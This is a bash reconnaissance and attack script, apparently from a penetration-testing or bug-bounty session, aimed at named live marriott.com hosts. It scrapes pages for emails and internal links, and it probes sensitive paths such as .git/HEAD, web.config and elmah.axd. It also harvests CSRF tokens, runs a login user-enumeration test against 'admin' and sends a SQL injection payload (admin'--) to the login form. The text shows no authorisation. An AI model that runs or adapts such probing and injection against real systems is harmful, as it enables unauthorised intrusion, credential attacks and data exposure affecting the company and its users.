#!/usr/bin/env bash
# Session 13 Follow-up — bpa2.marriott.com (primary) + esupplier Word doc analysis
# Fixes: Python quoting issues, adds cookie-aware bpa2 probing, CSRF-aware SQLi
# Run: bash PI-FOLLOWUP-session13-bpa2-esupplier.sh 2>&1 | tee /tmp/s13-followup.txt
# Date: 2026-06-22

COOKIE_JAR="/tmp/bpa2-cookies-$$.txt"

probe() {
  local url="$1"
  curl -sk -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}|$url\n" \
    --max-time 10 "$url" 2>/dev/null
}

fetch() {
  curl -sk -i --max-time 15 "$1" 2>/dev/null | head -80
}

echo "======================================================================"
echo "SESSION 13 FOLLOW-UP — bpa2 + esupplier"
echo "Date: $(date -u)"
echo "======================================================================"

# ==============================================================================
# PART A: esupplier Word document content extraction
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== PART A: esupplier — Extract Word doc content + find real app URL ==="
echo "======================================================================"

curl -sk "https://esupplier.marriott.com/" > /tmp/esupplier-root-$$.html

python3 << 'PYEOF'
import re

with open(f'/tmp/esupplier-root-{__import__("os").getpid()}.html', 'r', errors='ignore') as f:
    # Try without pid first (use glob)
    pass
PYEOF

python3 - << 'PYEOF'
import re, glob, os

# Find the temp file
files = glob.glob('/tmp/esupplier-root-*.html')
html = open(files[0]).read() if files else ''

print(f"File size: {len(html)}B")
print()

# Extract all hyperlinks
links = re.findall(r'href=["\']([^"\']+)["\']', html, re.I)
print("=== ALL HYPERLINKS ===")
for l in sorted(set(links))[:30]:
    print(f"  {l}")

# Extract all URLs in text
text_urls = re.findall(r'https?://[^\s<>"\')\]]+', html)
print()
print("=== TEXT URLs ===")
for u in sorted(set(text_urls))[:20]:
    print(f"  {u}")

# Extract visible text (strip HTML tags)
text = re.sub(r'<[^>]+>', ' ', html)
text = re.sub(r'\s+', ' ', text).strip()
print()
print("=== VISIBLE TEXT (first 2000 chars) ===")
print(text[:2000])

# Look for email addresses
emails = re.findall(r'[\w.+-]+@[\w.+-]+\.[a-z]{2,}', html, re.I)
print()
print("=== EMAIL ADDRESSES FOUND ===")
for e in sorted(set(emails))[:10]:
    print(f"  {e}")

# Extract form actions
forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.I)
print()
print("=== FORM ACTIONS ===")
for f in forms[:10]:
    print(f"  {f}")
PYEOF

echo ""
echo "--- eidhelp robots.txt (200/38B — check content) ---"
curl -sk "https://eidhelp.marriott.com/robots.txt"
echo ""

echo ""
echo "--- eidhelp: extract dropdown values (real app URLs) ---"
curl -sk "https://eidhelp.marriott.com/" > /tmp/eidhelp-root-$$.html
python3 - << 'PYEOF'
import re, glob

files = glob.glob('/tmp/eidhelp-root-*.html')
html = open(files[0]).read() if files else ''

print(f"File size: {len(html)}B")

# Extract <select> dropdown options — these are the real app links
selects = re.findall(r'<select[^>]*id=["\']([^"\']+)["\'][^>]*>(.*?)</select>', html, re.I|re.S)
for sel_id, sel_content in selects:
    print(f"\n=== SELECT id={sel_id} ===")
    options = re.findall(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>(.*?)</option>', sel_content, re.I|re.S)
    for val, label in options:
        label = re.sub(r'<[^>]+>', '', label).strip()
        print(f"  value={val!r:60} label={label!r}")

# All hrefs
links = re.findall(r'href=["\']([^"\']+)["\']', html, re.I)
print("\n=== HYPERLINKS ===")
for l in sorted(set(links)):
    print(f"  {l}")

# Text URLs
text_urls = re.findall(r'https?://[^\s<>"\')\]]+', html)
print("\n=== TEXT URLs ===")
for u in sorted(set(text_urls)):
    print(f"  {u}")
PYEOF

# ==============================================================================
# PART B: bpa2.marriott.com — Cookie-aware probing + CSRF-aware SQLi
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== PART B: bpa2.marriott.com — Full probing with cookie support ==="
echo "======================================================================"
echo "Server: CPWS | App: BPA-Connector (MCNC) | CSP leaks: localhost:14186"
echo ""

BPA2="https://bpa2.marriott.com"

echo "--- B1. Pre-auth path probe (with cookies) ---"
# Initialize cookie jar first
curl -sk -L -c "$COOKIE_JAR" -o /dev/null "$BPA2/" 2>/dev/null

for path in /robots.txt /sitemap.xml /elmah.axd /web.config /web.config.bak \
            /swagger /swagger-ui/ /swagger-ui/index.html \
            /v2/api-docs /v3/api-docs /openapi.json \
            /api/ /api/v1/ /api/v1/values /api/v1/health \
            /health /status /info /ping \
            /Admin/ /admin/ /Management/ \
            /.git/HEAD /trace.axd \
            /Login/Login.css /Login/images/ \
            /Content/ /Scripts/ /bundles/ \
            /BPA/ /BPA2/ /MCNC/ /Connector/ \
            /Login/ForgotPassword /Login/Register \
            /api/Account /api/auth /api/token; do
  result=$(curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -o /dev/null -w "%{http_code}|%{size_download}" \
    --max-time 10 "${BPA2}${path}" 2>/dev/null)
  echo "$result|${BPA2}${path}"
done

echo ""
echo "--- B2. Fetch any non-302 pre-auth paths ---"
for path in /robots.txt /elmah.axd /swagger /api/ /api/v1/ \
            /health /.git/HEAD /Login/Login.css; do
  code=$(curl -sk -b "$COOKIE_JAR" -o /dev/null -w "%{http_code}" \
    --max-time 10 "${BPA2}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BPA2}${path} (HTTP $code) ==="
    curl -sk -b "$COOKIE_JAR" -i --max-time 15 "${BPA2}${path}" | head -60
    echo "---"
    if [ "$path" = "/elmah.axd" ] && [ "$code" = "200" ]; then
      echo "*** CRITICAL: ELMAH error log exposed — full HTTP traces visible ***"
    fi
  fi
done

echo ""
echo "--- B3. Get real login page + extract CSRF token ---"
LOGIN_HTML=$(curl -sk -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --max-time 15 "${BPA2}/Login/Login" 2>/dev/null)
echo "Login page size: $(echo "$LOGIN_HTML" | wc -c)B"

CSRF_TOKEN=$(echo "$LOGIN_HTML" | python3 -c "
import sys, re
html = sys.stdin.read()

# Try multiple CSRF token patterns
patterns = [
    r'name=[\"]\s*__RequestVerificationToken\s*[\"][^>]*value=[\"](.*?)[\"]',
    r'value=[\"](.*?)[\"][^>]*name=[\"]\s*__RequestVerificationToken\s*[\"]',
    r'name=[\"]\s*_csrf\s*[\"][^>]*value=[\"](.*?)[\"]',
    r'name=[\"]\s*csrf_token\s*[\"][^>]*value=[\"](.*?)[\"]',
    r'meta[^>]*name=[\"]\s*csrf-token\s*[\"][^>]*content=[\"](.*?)[\"]',
]
for pat in patterns:
    m = re.search(pat, html, re.I)
    if m:
        print(m.group(1))
        break
else:
    print('NOT_FOUND')
" 2>/dev/null)

echo "CSRF_TOKEN: ${CSRF_TOKEN:0:50}..."

# Extract form inputs
echo "$LOGIN_HTML" | python3 -c "
import sys, re
html = sys.stdin.read()
inputs = re.findall(r'<input[^>]+>', html, re.I)
print('=== FORM INPUTS ===')
for inp in inputs[:20]:
    name = re.search(r'name=[\"](.*?)[\"]', inp, re.I)
    type_ = re.search(r'type=[\"](.*?)[\"]', inp, re.I)
    print(f'  name={name.group(1) if name else \"?\"!r:30} type={type_.group(1) if type_ else \"?\"!r}')
forms = re.findall(r'<form[^>]*>', html, re.I)
print()
print('=== FORM TAGS ===')
for f in forms[:5]:
    print(f'  {f[:150]}')
title = re.search(r'<title>(.*?)</title>', html, re.I)
print()
print(f'TITLE: {title.group(1) if title else \"?\"}')
" 2>/dev/null

echo ""
echo "--- B4. Login differential — user enum test (with CSRF + cookies) ---"
# Fresh cookies for each test
COOKIE1="/tmp/bpa2-c1-$$.txt"
COOKIE2="/tmp/bpa2-c2-$$.txt"

# Get fresh CSRF for test 1
PAGE1=$(curl -sk -c "$COOKIE1" -o - "${BPA2}/Login/Login" 2>/dev/null)
CSRF1=$(echo "$PAGE1" | python3 -c "
import sys, re
html = sys.stdin.read()
m = re.search(r'name=[\"]\s*__RequestVerificationToken\s*[\"][^>]*value=[\"](.*?)[\"]', html, re.I)
if not m: m = re.search(r'value=[\"](.*?)[\"][^>]*name=[\"]\s*__RequestVerificationToken\s*[\"]', html, re.I)
print(m.group(1) if m else '')
" 2>/dev/null)

# Get fresh CSRF for test 2
PAGE2=$(curl -sk -c "$COOKIE2" -o - "${BPA2}/Login/Login" 2>/dev/null)
CSRF2=$(echo "$PAGE2" | python3 -c "
import sys, re
html = sys.stdin.read()
m = re.search(r'name=[\"]\s*__RequestVerificationToken\s*[\"][^>]*value=[\"](.*?)[\"]', html, re.I)
if not m: m = re.search(r'value=[\"](.*?)[\"][^>]*name=[\"]\s*__RequestVerificationToken\s*[\"]', html, re.I)
print(m.group(1) if m else '')
" 2>/dev/null)

# Determine field names from login page
USERNAME_FIELD=$(echo "$PAGE1" | python3 -c "
import sys, re
html = sys.stdin.read()
# Common username field names
for name in ['Username','username','user','User','login','Login','email','Email','UserId','userid']:
    if re.search(rf'name=[\"]{name}[\"']', html, re.I):
        print(name); break
else:
    print('Username')
" 2>/dev/null)

PASSWORD_FIELD=$(echo "$PAGE1" | python3 -c "
import sys, re
html = sys.stdin.read()
for name in ['Password','password','pass','Pass']:
    if re.search(rf'name=[\"]{name}[\"']', html, re.I):
        print(name); break
else:
    print('Password')
" 2>/dev/null)

echo "Detected field names: username=$USERNAME_FIELD password=$PASSWORD_FIELD"
echo "CSRF1: ${CSRF1:0:30}..."
echo "CSRF2: ${CSRF2:0:30}..."

# Test 1: likely-valid username format
if [ -n "$CSRF1" ]; then
  CSRF_DATA1="__RequestVerificationToken=${CSRF1}&"
else
  CSRF_DATA1=""
fi

r1=$(curl -sk -b "$COOKIE1" -c "$COOKIE1" \
  -o /tmp/bpa2-login1-$$.txt -w "%{http_code}" \
  -X POST "${BPA2}/Login/Login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "${CSRF_DATA1}${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=WrongPassword99" \
  --max-time 12 2>/dev/null)
s1=$(wc -c < /tmp/bpa2-login1-$$.txt 2>/dev/null || echo 0)

# Test 2: invalid username format
if [ -n "$CSRF2" ]; then
  CSRF_DATA2="__RequestVerificationToken=${CSRF2}&"
else
  CSRF_DATA2=""
fi

r2=$(curl -sk -b "$COOKIE2" -c "$COOKIE2" \
  -o /tmp/bpa2-login2-$$.txt -w "%{http_code}" \
  -X POST "${BPA2}/Login/Login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "${CSRF_DATA2}${USERNAME_FIELD}=zzz_9x9_invalid@nowhere.invalid&${PASSWORD_FIELD}=WrongPassword99" \
  --max-time 12 2>/dev/null)
s2=$(wc -c < /tmp/bpa2-login2-$$.txt 2>/dev/null || echo 0)

echo "Login(admin / wrong):           HTTP $r1 / ${s1}B"
echo "Login(nonexistent / wrong):     HTTP $r2 / ${s2}B"

if [ "$s1" != "$s2" ] || [ "$r1" != "$r2" ]; then
  echo "*** DIFFERENTIAL DETECTED — USER ENUMERATION CANDIDATE ***"
  echo "=== Response 1 tail (admin): ==="
  tail -10 /tmp/bpa2-login1-$$.txt
  echo "=== Response 2 tail (nonexistent): ==="
  tail -10 /tmp/bpa2-login2-$$.txt
else
  echo "No differential — same HTTP code and size"
fi
rm -f /tmp/bpa2-login1-$$.txt /tmp/bpa2-login2-$$.txt "$COOKIE1" "$COOKIE2"

echo ""
echo "--- B5. SQLi probe on login (boolean-based, safe) ---"
COOKIE3="/tmp/bpa2-c3-$$.txt"
PAGE3=$(curl -sk -c "$COOKIE3" -o - "${BPA2}/Login/Login" 2>/dev/null)
CSRF3=$(echo "$PAGE3" | python3 -c "
import sys, re
html = sys.stdin.read()
m = re.search(r'name=[\"]\s*__RequestVerificationToken\s*[\"][^>]*value=[\"](.*?)[\"]', html, re.I)
if not m: m = re.search(r'value=[\"](.*?)[\"][^>]*name=[\"]\s*__RequestVerificationToken\s*[\"]', html, re.I)
print(m.group(1) if m else '')
" 2>/dev/null)

r3=$(curl -sk -b "$COOKIE3" \
  -o /tmp/bpa2-sqli-$$.txt -w "%{http_code}" \
  -X POST "${BPA2}/Login/Login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "__RequestVerificationToken=${CSRF3}" \
  --data-urlencode "${USERNAME_FIELD}=admin'--" \
  --data-urlencode "${PASSWORD_FIELD}=x" \
  --max-time 12 2>/dev/null)
s3=$(wc -c < /tmp/bpa2-sqli-$$.txt 2>/dev/null || echo 0)
echo "SQLi test (admin'--): HTTP $r3 / ${s3}B"

if [ "$r3" = "500" ]; then
  echo "*** CRITICAL: HTTP 500 on SQL quote injection — SQLi confirmed ***"
  head -50 /tmp/bpa2-sqli-$$.txt
elif [ "$r3" = "200" ] && [ "$s3" -gt 2000 ]; then
  echo "*** POSSIBLE SQLi: 200 with large body on injected input (vs normal bad-creds?) ***"
  tail -20 /tmp/bpa2-sqli-$$.txt
else
  echo "No SQLi signal (HTTP $r3 / ${s3}B)"
fi
rm -f /tmp/bpa2-sqli-$$.txt "$COOKIE3"

echo ""
echo "--- B6. Probe MCNC/BPA-specific paths ---"
for path in /BPAConnector/ /bpa/ /bpa-connector/ /MCNC/ /mcnc/ \
            /Connector/ /connector/ /api/connector/ \
            /Login/ForgotPassword /Login/ForgotPassword/ \
            /Login/ResetPassword /Account/ForgotPassword \
            /api/v1/auth /api/auth/token /token \
            /ws /websocket; do
  result=$(curl -sk -b "$COOKIE_JAR" \
    -o /dev/null -w "%{http_code}|%{size_download}" \
    --max-time 8 "${BPA2}${path}" 2>/dev/null)
  code="${result%%|*}"
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "*** LIVE: $result|${BPA2}${path} ***"
    curl -sk -b "$COOKIE_JAR" -i --max-time 10 "${BPA2}${path}" | head -40
    echo "---"
  else
    echo "$result|${BPA2}${path}"
  fi
done

echo ""
echo "--- B7. CSP localhost:14186 WebSocket probe (informational) ---"
echo "CSP header exposes internal WS port: wss://localhost:14186"
echo "This reveals the app uses a local WebSocket server on port 14186."
echo "Cannot probe from external — documenting as information disclosure."

# Cleanup
rm -f "$COOKIE_JAR" /tmp/esupplier-root-*.html /tmp/eidhelp-root-*.html

echo ""
echo "======================================================================"
echo "=== FOLLOW-UP COMPLETE: $(date -u) ==="
echo "=== Copy /tmp/s13-followup.txt and paste output ==="
echo "======================================================================"
echo ""
echo "=== TRIAGE SIGNALS ==="
echo "CRITICAL: elmah.axd HTTP 200 → full error log exposed"
echo "CRITICAL: SQLi HTTP 500 on admin'-- → immediate report"
echo "HIGH:     login response differential → user enumeration"
echo "HIGH:     esupplier Word doc links to internal portal URL"
echo "INFO:     bpa2 CSP wss://localhost:14186 → internal port disclosure"
echo "INFO:     eidhelp x-amz-meta-user-agent-id → employee username in header"
